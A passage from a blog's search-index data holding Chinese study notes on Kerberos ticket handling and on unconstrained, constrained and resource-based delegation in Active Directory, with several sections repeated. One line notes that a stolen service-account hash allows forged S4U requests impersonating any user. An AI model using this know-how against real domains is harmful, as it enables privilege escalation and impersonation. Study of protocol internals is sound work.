hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据) KDC在HandleTGSRequest中处理TGS_REQ消息 首先，通过krbtgt hash解密查看票据是否合法 之后，计算检查CheckSum中的签名 KDC在I_GetTGSTicket中构造TGS 通过KdcGetTicketInfo函数获取构建Ticket需要的信息 构建TGSTicket Ticket内容如下 向其中添加对于客户端的认证信息 包括证书的有效时间和认证信息 最后申请Reply结构并进行填充，和之前一样进行打包加密 Ticket为用ServerHash加密的TGSTicket enc-part为使用Logon Session Key加密的认证消息，包含Client和Server建立会话的Session Key ","date":"2021-12-30","objectID":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:4","series":[],"tags":[],"title":"Kerberos 学习笔记","uri":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#tgs_rep"},{"categories":[],"content":"\rAP_REQ \u0026 AS_REP在TGS的请求过程中对于身份的验证便是通过AP_REQ，所以不再赘述 ","date":"2021-12-30","objectID":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:5","series":[],"tags":[],"title":"Kerberos 学习笔记","uri":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#ap_req--as_rep"},{"categories":[],"content":"\r委派分析","date":"2021-12-30","objectID":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:0","series":[],"tags":[],"title":"Kerberos 学习笔记","uri":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#委派分析"},{"categories":[],"content":"\r非约束委派\r基本流程 上图描述了以下协议步骤： 用户通过发送KRB_AS_REQ消息请求可转发 TGT（forwardable TGT，为了方便我们称为TGT1） KDC在KRB_AS_REP消息中返回TGT1 用户再通过TGT1向KDC请求转发TGT（forwarded TGT，我们称为TGT2） 在KRB_TGS_REP消息中返回转发TGT2 用户使用TGT1向KDC申请访问Service1的ST（ServiceTicket） TGS返回给用户一个ST 用户发送KRB_AP_REQ请求至Service1，这个请求中包含了TGT1和ST、TGT2、TGT2的SessionKey Service1使用用户的TGT2通过KRB_TGS_REQ发送给KDC，以用户的名义请求能够访问Service2的票据 KDC在KRB_TGS_REP消息中返回Service2到Service1的票据 Service1以用户的名义向Service2发送KRB_AP_REQ请求 Service2响应步骤10中Service1的请求 Service1响应步骤7中用户的请求 在这个过程中的TGT转发机制，没有限制Service1对TGT2的使用，也就是说Service1可以通过TGT2来请求任意服务 KDC返回步骤13中请求的票据，15和16即为Service1通过模拟用户来访问其他Service 当user访问service1时，如果service1的服务账号开启了unconstrained delegation（非约束委派），则当user访问service1时会将user的TGT发送给service1并保存在内存中以备下次重用，然后service1 就可以利用这张TGT以user的身份去访问域内的任何服务（任何服务是指user能访问的服务）了 配置 每个账户都存在一个属性值UserAccountControl，其值可以决定Kerberos委派的性质 具体的值及其对应含义请参考：https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties 使用SysinternalsSuite中的ADExplorer工具可以很方便的查看AD域中的所有属性 和非约束委派相关的属性为0x80000 调试分析正常情况下一次请求只会出现一次TGS_REQ 但是在开启非约束委派的情况下会发起两次 其中途中标号为9的请求对应上述描述中的第5步，为客户端请求需要的服务的ST的过程 所以kdc-options中的forwarded为0 sname为cifs 标号为17的请求为对于TGT2（forwarded TGT）的请求，对应上述描述中的第3步 所以kdc-options中的forwarded为1 sname为krbtgt TGT2— TicketGrantingTicket TGT2的SessionKey—TicketGrantingTicket. SessionKey TGT1— TicketGrantingTicket.Ticket KerbBuildGssChecksum的第三参数Ticket即为ServiceTicket 之后会将该结果后打包加密后放入CheckSumBody-\u003eDelegationInfo中 ","date":"2021-12-30","objectID":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:1","series":[],"tags":[],"title":"Kerberos 学习笔记","uri":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#非约束委派"},{"categories":[],"content":"\r非约束委派\r基本流程 上图描述了以下协议步骤： 用户通过发送KRB_AS_REQ消息请求可转发 TGT（forwardable TGT，为了方便我们称为TGT1） KDC在KRB_AS_REP消息中返回TGT1 用户再通过TGT1向KDC请求转发TGT（forwarded TGT，我们称为TGT2） 在KRB_TGS_REP消息中返回转发TGT2 用户使用TGT1向KDC申请访问Service1的ST（ServiceTicket） TGS返回给用户一个ST 用户发送KRB_AP_REQ请求至Service1，这个请求中包含了TGT1和ST、TGT2、TGT2的SessionKey Service1使用用户的TGT2通过KRB_TGS_REQ发送给KDC，以用户的名义请求能够访问Service2的票据 KDC在KRB_TGS_REP消息中返回Service2到Service1的票据 Service1以用户的名义向Service2发送KRB_AP_REQ请求 Service2响应步骤10中Service1的请求 Service1响应步骤7中用户的请求 在这个过程中的TGT转发机制，没有限制Service1对TGT2的使用，也就是说Service1可以通过TGT2来请求任意服务 KDC返回步骤13中请求的票据，15和16即为Service1通过模拟用户来访问其他Service 当user访问service1时，如果service1的服务账号开启了unconstrained delegation（非约束委派），则当user访问service1时会将user的TGT发送给service1并保存在内存中以备下次重用，然后service1 就可以利用这张TGT以user的身份去访问域内的任何服务（任何服务是指user能访问的服务）了 配置 每个账户都存在一个属性值UserAccountControl，其值可以决定Kerberos委派的性质 具体的值及其对应含义请参考：https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties 使用SysinternalsSuite中的ADExplorer工具可以很方便的查看AD域中的所有属性 和非约束委派相关的属性为0x80000 调试分析正常情况下一次请求只会出现一次TGS_REQ 但是在开启非约束委派的情况下会发起两次 其中途中标号为9的请求对应上述描述中的第5步，为客户端请求需要的服务的ST的过程 所以kdc-options中的forwarded为0 sname为cifs 标号为17的请求为对于TGT2（forwarded TGT）的请求，对应上述描述中的第3步 所以kdc-options中的forwarded为1 sname为krbtgt TGT2— TicketGrantingTicket TGT2的SessionKey—TicketGrantingTicket. SessionKey TGT1— TicketGrantingTicket.Ticket KerbBuildGssChecksum的第三参数Ticket即为ServiceTicket 之后会将该结果后打包加密后放入CheckSumBody-\u003eDelegationInfo中 ","date":"2021-12-30","objectID":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:1","series":[],"tags":[],"title":"Kerberos 学习笔记","uri":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#基本流程"},{"categories":[],"content":"\r非约束委派\r基本流程 上图描述了以下协议步骤： 用户通过发送KRB_AS_REQ消息请求可转发 TGT（forwardable TGT，为了方便我们称为TGT1） KDC在KRB_AS_REP消息中返回TGT1 用户再通过TGT1向KDC请求转发TGT（forwarded TGT，我们称为TGT2） 在KRB_TGS_REP消息中返回转发TGT2 用户使用TGT1向KDC申请访问Service1的ST（ServiceTicket） TGS返回给用户一个ST 用户发送KRB_AP_REQ请求至Service1，这个请求中包含了TGT1和ST、TGT2、TGT2的SessionKey Service1使用用户的TGT2通过KRB_TGS_REQ发送给KDC，以用户的名义请求能够访问Service2的票据 KDC在KRB_TGS_REP消息中返回Service2到Service1的票据 Service1以用户的名义向Service2发送KRB_AP_REQ请求 Service2响应步骤10中Service1的请求 Service1响应步骤7中用户的请求 在这个过程中的TGT转发机制，没有限制Service1对TGT2的使用，也就是说Service1可以通过TGT2来请求任意服务 KDC返回步骤13中请求的票据，15和16即为Service1通过模拟用户来访问其他Service 当user访问service1时，如果service1的服务账号开启了unconstrained delegation（非约束委派），则当user访问service1时会将user的TGT发送给service1并保存在内存中以备下次重用，然后service1 就可以利用这张TGT以user的身份去访问域内的任何服务（任何服务是指user能访问的服务）了 配置 每个账户都存在一个属性值UserAccountControl，其值可以决定Kerberos委派的性质 具体的值及其对应含义请参考：https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties 使用SysinternalsSuite中的ADExplorer工具可以很方便的查看AD域中的所有属性 和非约束委派相关的属性为0x80000 调试分析正常情况下一次请求只会出现一次TGS_REQ 但是在开启非约束委派的情况下会发起两次 其中途中标号为9的请求对应上述描述中的第5步，为客户端请求需要的服务的ST的过程 所以kdc-options中的forwarded为0 sname为cifs 标号为17的请求为对于TGT2（forwarded TGT）的请求，对应上述描述中的第3步 所以kdc-options中的forwarded为1 sname为krbtgt TGT2— TicketGrantingTicket TGT2的SessionKey—TicketGrantingTicket. SessionKey TGT1— TicketGrantingTicket.Ticket KerbBuildGssChecksum的第三参数Ticket即为ServiceTicket 之后会将该结果后打包加密后放入CheckSumBody-\u003eDelegationInfo中 ","date":"2021-12-30","objectID":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:1","series":[],"tags":[],"title":"Kerberos 学习笔记","uri":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#配置"},{"categories":[],"content":"\r非约束委派\r基本流程 上图描述了以下协议步骤： 用户通过发送KRB_AS_REQ消息请求可转发 TGT（forwardable TGT，为了方便我们称为TGT1） KDC在KRB_AS_REP消息中返回TGT1 用户再通过TGT1向KDC请求转发TGT（forwarded TGT，我们称为TGT2） 在KRB_TGS_REP消息中返回转发TGT2 用户使用TGT1向KDC申请访问Service1的ST（ServiceTicket） TGS返回给用户一个ST 用户发送KRB_AP_REQ请求至Service1，这个请求中包含了TGT1和ST、TGT2、TGT2的SessionKey Service1使用用户的TGT2通过KRB_TGS_REQ发送给KDC，以用户的名义请求能够访问Service2的票据 KDC在KRB_TGS_REP消息中返回Service2到Service1的票据 Service1以用户的名义向Service2发送KRB_AP_REQ请求 Service2响应步骤10中Service1的请求 Service1响应步骤7中用户的请求 在这个过程中的TGT转发机制，没有限制Service1对TGT2的使用，也就是说Service1可以通过TGT2来请求任意服务 KDC返回步骤13中请求的票据，15和16即为Service1通过模拟用户来访问其他Service 当user访问service1时，如果service1的服务账号开启了unconstrained delegation（非约束委派），则当user访问service1时会将user的TGT发送给service1并保存在内存中以备下次重用，然后service1 就可以利用这张TGT以user的身份去访问域内的任何服务（任何服务是指user能访问的服务）了 配置 每个账户都存在一个属性值UserAccountControl，其值可以决定Kerberos委派的性质 具体的值及其对应含义请参考：https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties 使用SysinternalsSuite中的ADExplorer工具可以很方便的查看AD域中的所有属性 和非约束委派相关的属性为0x80000 调试分析正常情况下一次请求只会出现一次TGS_REQ 但是在开启非约束委派的情况下会发起两次 其中途中标号为9的请求对应上述描述中的第5步，为客户端请求需要的服务的ST的过程 所以kdc-options中的forwarded为0 sname为cifs 标号为17的请求为对于TGT2（forwarded TGT）的请求，对应上述描述中的第3步 所以kdc-options中的forwarded为1 sname为krbtgt TGT2— TicketGrantingTicket TGT2的SessionKey—TicketGrantingTicket. SessionKey TGT1— TicketGrantingTicket.Ticket KerbBuildGssChecksum的第三参数Ticket即为ServiceTicket 之后会将该结果后打包加密后放入CheckSumBody-\u003eDelegationInfo中 ","date":"2021-12-30","objectID":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:1","series":[],"tags":[],"title":"Kerberos 学习笔记","uri":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#调试分析"},{"categories":[],"content":"\r约束委派\r基本流程约束委派在Kerberos中User不会直接发送TGT给服务，而是对发送给service1的认证信息做了限制，不允许service1代表User使用这个TGT去访问其他服务。其中包括一组名为S4U2Self（Service for User to Self）和S4U2Proxy（Service for User to Proxy）的Kerberos协议扩展。 请求过程如下： 用户向Service1发送请求。 这时在官方文档中的介绍是在这一流程开始之前Service1已经通过KRB_AS_REQ得到了用户用来访问Service1的TGT，然后通过S4U2self扩展模拟用户向KDC请求ST。 KDC这时返回给Service1一个用于用户验证Service1的ST（我们称为ST1），并且Service1用这个ST1完成和用户的验证过程。 Service1在步骤3使用模拟用户申请的ST1完成与用户的验证，然后响应用户。 注：这个过程中其实Service1是获得了用户的TGT和ST1的，但是S4U2Self扩展不允许Service1代表用户去请求其他的服务。 用户再次向Service1发起请求，此时Service1需要以用户的身份访问Service2。这里官方文档提到了两个点： A.Service1已经验证通过，并且有一个有效的TGT。 B.Service1有从用户到Service1的forwardableST（可转发ST）。个人认为这里的forwardable ST其实也就是ST1。 Service1代表用户向Service2请求一个用于认证Service2的ST（我们称为ST2）。用户在ST1中通过cname（client name）和crealm（client realm）字段标识。 KDC在接收到步骤6中Service1的请求之后，会验证PAC（特权属性证书，在第一篇中有说明）的数字签名。如果验证成功或者这个请求没有PAC（不能验证失败），KDC将返回ST2给Service1，不过这个ST2中cname和crealm标识的是用户而不是Service1。 Service1代表用户使用ST2请求Service2。Service2判断这个请求来自已经通过KDC验证的用户。 Service2响应Service1的请求。 Service1响应用户的请求。 在这个过程中： S4U2self可以代表自身请求针对其自身的Kerberos服务票据(ST) S4U2proxy可以以用户的名义请求其它服务的ST 同时注意forwardable字段，有forwardable标记为可转发的是能够通过S4U2Proxy扩展协议进行转发的，如果没有标记则不能进行转发。 最后的结果：在约束委派中服务账号只能获取某用户的ST（也就是TGS），所以只能模拟用户访问特定的服务，是无法获取用户的TGT，如果我们能获取到开启了约束委派的服务用户的明文密码或者NTLM Hash，我们就可以伪造S4U请求，进而伪装成服务用户以任意账户的权限申请访问某服务的ST 配置Windows Server 2003 已经支持约束委派，但是并没有可视化的设置界面，需要通过ADExplorer工具修改属性值，开启约束委派。 约束委派对应值为 调试分析 步骤2中S4U2Self是通过KerbGetS4USelfServiceTicket函数完成。 首先获取Service自身的TGT，进行身份认证 其次将“冒充”客户的身份去申请针对自身的TGS 步骤5中的S4U2Proxy在KerbGetServiceTicketByS4UProxy中完成 与以往不同的是这次会存在一个AdditionTicket，其中是上一步返回的TGS 在KDC中会对这个AdditionTicket进行检查 其中最重要的一步便是通过KerbCheckA2D2Attribute对委派进行限制，只有 msDS-AllowedToDelegateto中存在的项才允许访问 返回TGS 检查通过后KdcUnpackAdditionalTickets会返回S4UTicketInfo 内容如下 之后便是正常的返回TGS的流程 ","date":"2021-12-30","objectID":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:2","series":[],"tags":[],"title":"Kerberos 学习笔记","uri":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#约束委派"},{"categories":[],"content":"\r约束委派\r基本流程约束委派在Kerberos中User不会直接发送TGT给服务，而是对发送给service1的认证信息做了限制，不允许service1代表User使用这个TGT去访问其他服务。其中包括一组名为S4U2Self（Service for User to Self）和S4U2Proxy（Service for User to Proxy）的Kerberos协议扩展。 请求过程如下： 用户向Service1发送请求。 这时在官方文档中的介绍是在这一流程开始之前Service1已经通过KRB_AS_REQ得到了用户用来访问Service1的TGT，然后通过S4U2self扩展模拟用户向KDC请求ST。 KDC这时返回给Service1一个用于用户验证Service1的ST（我们称为ST1），并且Service1用这个ST1完成和用户的验证过程。 Service1在步骤3使用模拟用户申请的ST1完成与用户的验证，然后响应用户。 注：这个过程中其实Service1是获得了用户的TGT和ST1的，但是S4U2Self扩展不允许Service1代表用户去请求其他的服务。 用户再次向Service1发起请求，此时Service1需要以用户的身份访问Service2。这里官方文档提到了两个点： A.Service1已经验证通过，并且有一个有效的TGT。 B.Service1有从用户到Service1的forwardableST（可转发ST）。个人认为这里的forwardable ST其实也就是ST1。 Service1代表用户向Service2请求一个用于认证Service2的ST（我们称为ST2）。用户在ST1中通过cname（client name）和crealm（client realm）字段标识。 KDC在接收到步骤6中Service1的请求之后，会验证PAC（特权属性证书，在第一篇中有说明）的数字签名。如果验证成功或者这个请求没有PAC（不能验证失败），KDC将返回ST2给Service1，不过这个ST2中cname和crealm标识的是用户而不是Service1。 Service1代表用户使用ST2请求Service2。Service2判断这个请求来自已经通过KDC验证的用户。 Service2响应Service1的请求。 Service1响应用户的请求。 在这个过程中： S4U2self可以代表自身请求针对其自身的Kerberos服务票据(ST) S4U2proxy可以以用户的名义请求其它服务的ST 同时注意forwardable字段，有forwardable标记为可转发的是能够通过S4U2Proxy扩展协议进行转发的，如果没有标记则不能进行转发。 最后的结果：在约束委派中服务账号只能获取某用户的ST（也就是TGS），所以只能模拟用户访问特定的服务，是无法获取用户的TGT，如果我们能获取到开启了约束委派的服务用户的明文密码或者NTLM Hash，我们就可以伪造S4U请求，进而伪装成服务用户以任意账户的权限申请访问某服务的ST 配置Windows Server 2003 已经支持约束委派，但是并没有可视化的设置界面，需要通过ADExplorer工具修改属性值，开启约束委派。 约束委派对应值为 调试分析 步骤2中S4U2Self是通过KerbGetS4USelfServiceTicket函数完成。 首先获取Service自身的TGT，进行身份认证 其次将“冒充”客户的身份去申请针对自身的TGS 步骤5中的S4U2Proxy在KerbGetServiceTicketByS4UProxy中完成 与以往不同的是这次会存在一个AdditionTicket，其中是上一步返回的TGS 在KDC中会对这个AdditionTicket进行检查 其中最重要的一步便是通过KerbCheckA2D2Attribute对委派进行限制，只有 msDS-AllowedToDelegateto中存在的项才允许访问 返回TGS 检查通过后KdcUnpackAdditionalTickets会返回S4UTicketInfo 内容如下 之后便是正常的返回TGS的流程 ","date":"2021-12-30","objectID":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:2","series":[],"tags":[],"title":"Kerberos 学习笔记","uri":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#基本流程-1"},{"categories":[],"content":"\r约束委派\r基本流程约束委派在Kerberos中User不会直接发送TGT给服务，而是对发送给service1的认证信息做了限制，不允许service1代表User使用这个TGT去访问其他服务。其中包括一组名为S4U2Self（Service for User to Self）和S4U2Proxy（Service for User to Proxy）的Kerberos协议扩展。 请求过程如下： 用户向Service1发送请求。 这时在官方文档中的介绍是在这一流程开始之前Service1已经通过KRB_AS_REQ得到了用户用来访问Service1的TGT，然后通过S4U2self扩展模拟用户向KDC请求ST。 KDC这时返回给Service1一个用于用户验证Service1的ST（我们称为ST1），并且Service1用这个ST1完成和用户的验证过程。 Service1在步骤3使用模拟用户申请的ST1完成与用户的验证，然后响应用户。 注：这个过程中其实Service1是获得了用户的TGT和ST1的，但是S4U2Self扩展不允许Service1代表用户去请求其他的服务。 用户再次向Service1发起请求，此时Service1需要以用户的身份访问Service2。这里官方文档提到了两个点： A.Service1已经验证通过，并且有一个有效的TGT。 B.Service1有从用户到Service1的forwardableST（可转发ST）。个人认为这里的forwardable ST其实也就是ST1。 Service1代表用户向Service2请求一个用于认证Service2的ST（我们称为ST2）。用户在ST1中通过cname（client name）和crealm（client realm）字段标识。 KDC在接收到步骤6中Service1的请求之后，会验证PAC（特权属性证书，在第一篇中有说明）的数字签名。如果验证成功或者这个请求没有PAC（不能验证失败），KDC将返回ST2给Service1，不过这个ST2中cname和crealm标识的是用户而不是Service1。 Service1代表用户使用ST2请求Service2。Service2判断这个请求来自已经通过KDC验证的用户。 Service2响应Service1的请求。 Service1响应用户的请求。 在这个过程中： S4U2self可以代表自身请求针对其自身的Kerberos服务票据(ST) S4U2proxy可以以用户的名义请求其它服务的ST 同时注意forwardable字段，有forwardable标记为可转发的是能够通过S4U2Proxy扩展协议进行转发的，如果没有标记则不能进行转发。 最后的结果：在约束委派中服务账号只能获取某用户的ST（也就是TGS），所以只能模拟用户访问特定的服务，是无法获取用户的TGT，如果我们能获取到开启了约束委派的服务用户的明文密码或者NTLM Hash，我们就可以伪造S4U请求，进而伪装成服务用户以任意账户的权限申请访问某服务的ST 配置Windows Server 2003 已经支持约束委派，但是并没有可视化的设置界面，需要通过ADExplorer工具修改属性值，开启约束委派。 约束委派对应值为 调试分析 步骤2中S4U2Self是通过KerbGetS4USelfServiceTicket函数完成。 首先获取Service自身的TGT，进行身份认证 其次将“冒充”客户的身份去申请针对自身的TGS 步骤5中的S4U2Proxy在KerbGetServiceTicketByS4UProxy中完成 与以往不同的是这次会存在一个AdditionTicket，其中是上一步返回的TGS 在KDC中会对这个AdditionTicket进行检查 其中最重要的一步便是通过KerbCheckA2D2Attribute对委派进行限制，只有 msDS-AllowedToDelegateto中存在的项才允许访问 返回TGS 检查通过后KdcUnpackAdditionalTickets会返回S4UTicketInfo 内容如下 之后便是正常的返回TGS的流程 ","date":"2021-12-30","objectID":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:2","series":[],"tags":[],"title":"Kerberos 学习笔记","uri":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#配置-1"},{"categories":[],"content":"\r约束委派\r基本流程约束委派在Kerberos中User不会直接发送TGT给服务，而是对发送给service1的认证信息做了限制，不允许service1代表User使用这个TGT去访问其他服务。其中包括一组名为S4U2Self（Service for User to Self）和S4U2Proxy（Service for User to Proxy）的Kerberos协议扩展。 请求过程如下： 用户向Service1发送请求。 这时在官方文档中的介绍是在这一流程开始之前Service1已经通过KRB_AS_REQ得到了用户用来访问Service1的TGT，然后通过S4U2self扩展模拟用户向KDC请求ST。 KDC这时返回给Service1一个用于用户验证Service1的ST（我们称为ST1），并且Service1用这个ST1完成和用户的验证过程。 Service1在步骤3使用模拟用户申请的ST1完成与用户的验证，然后响应用户。 注：这个过程中其实Service1是获得了用户的TGT和ST1的，但是S4U2Self扩展不允许Service1代表用户去请求其他的服务。 用户再次向Service1发起请求，此时Service1需要以用户的身份访问Service2。这里官方文档提到了两个点： A.Service1已经验证通过，并且有一个有效的TGT。 B.Service1有从用户到Service1的forwardableST（可转发ST）。个人认为这里的forwardable ST其实也就是ST1。 Service1代表用户向Service2请求一个用于认证Service2的ST（我们称为ST2）。用户在ST1中通过cname（client name）和crealm（client realm）字段标识。 KDC在接收到步骤6中Service1的请求之后，会验证PAC（特权属性证书，在第一篇中有说明）的数字签名。如果验证成功或者这个请求没有PAC（不能验证失败），KDC将返回ST2给Service1，不过这个ST2中cname和crealm标识的是用户而不是Service1。 Service1代表用户使用ST2请求Service2。Service2判断这个请求来自已经通过KDC验证的用户。 Service2响应Service1的请求。 Service1响应用户的请求。 在这个过程中： S4U2self可以代表自身请求针对其自身的Kerberos服务票据(ST) S4U2proxy可以以用户的名义请求其它服务的ST 同时注意forwardable字段，有forwardable标记为可转发的是能够通过S4U2Proxy扩展协议进行转发的，如果没有标记则不能进行转发。 最后的结果：在约束委派中服务账号只能获取某用户的ST（也就是TGS），所以只能模拟用户访问特定的服务，是无法获取用户的TGT，如果我们能获取到开启了约束委派的服务用户的明文密码或者NTLM Hash，我们就可以伪造S4U请求，进而伪装成服务用户以任意账户的权限申请访问某服务的ST 配置Windows Server 2003 已经支持约束委派，但是并没有可视化的设置界面，需要通过ADExplorer工具修改属性值，开启约束委派。 约束委派对应值为 调试分析 步骤2中S4U2Self是通过KerbGetS4USelfServiceTicket函数完成。 首先获取Service自身的TGT，进行身份认证 其次将“冒充”客户的身份去申请针对自身的TGS 步骤5中的S4U2Proxy在KerbGetServiceTicketByS4UProxy中完成 与以往不同的是这次会存在一个AdditionTicket，其中是上一步返回的TGS 在KDC中会对这个AdditionTicket进行检查 其中最重要的一步便是通过KerbCheckA2D2Attribute对委派进行限制，只有 msDS-AllowedToDelegateto中存在的项才允许访问 返回TGS 检查通过后KdcUnpackAdditionalTickets会返回S4UTicketInfo 内容如下 之后便是正常的返回TGS的流程 ","date":"2021-12-30","objectID":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:2","series":[],"tags":[],"title":"Kerberos 学习笔记","uri":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#调试分析-1"},{"categories":[],"content":"\r基于资源的约束委派在约束委派中，对于计算机或服务账户的属性设置只能由域管理员进行设置，配置其是否可以委派和委派的服务列表。但是在Windows Server 2008后引入了基于资源的约束委派（Resource-based constrained delegation）。计算机的用户属性中新添了一个全新的项，名为msDS-AllowedToActOnBehalfOfOtherIdentity，这个属性的设置由计算机本身进行，其可以控制谁可以被委托来访问自己的某些资源 之前的约束委派限制的是Service1是否可以委派其他人，现在基于资源的约束委派可以保证Service2控制自身资源的访问限制，一个是在发起者方进行限制，一个是在接收者方进行防护。 基于资源的约束委派（Resource-based constrained delegation），它除了不再需要域管理员权限去设置相关属性之外，请求ST的过程是和传统的约束委派大同小异，要注意一点就是传统的约束S4U2Self返回的票据一定是可转发的，如果不可转发那么S4U2Proxy将失败；但是基于资源约束委派不同，就算S4U2Self返回的票据不可转发（可不可以转发由TrustedToAuthenticationForDelegation决定），S4U2Proxy也是可以成功，并且S4U2Proxy返回的票据总是可转发。 ","date":"2021-12-30","objectID":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:3","series":[],"tags":[],"title":"Kerberos 学习笔记","uri":"/2021/12/kerberos-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#基于资源的约束委派"}]